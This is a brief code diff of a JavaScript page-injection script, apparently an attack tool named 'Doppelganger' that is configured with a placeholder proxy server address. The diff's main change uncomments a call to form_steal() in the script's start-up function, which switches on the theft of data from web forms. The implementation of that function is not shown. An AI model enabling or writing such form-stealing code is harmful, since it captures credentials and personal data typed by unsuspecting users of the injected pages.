@@ -21,14 +21,14 @@ THE SOFTWARE.
 */
 
 var httpServer="http://proxyIpAddr:httpPort";
-var $jDoppelganger = ""
+var $jDoppelganger = "";
 
 $jDoppelganger = jQuery.noConflict();
 
 function initialize_doppelganger()
 {
 	//display_calling_card();
-	//form_steal();
+	form_steal();
 	alert("Doppelganger running!");
 }
 
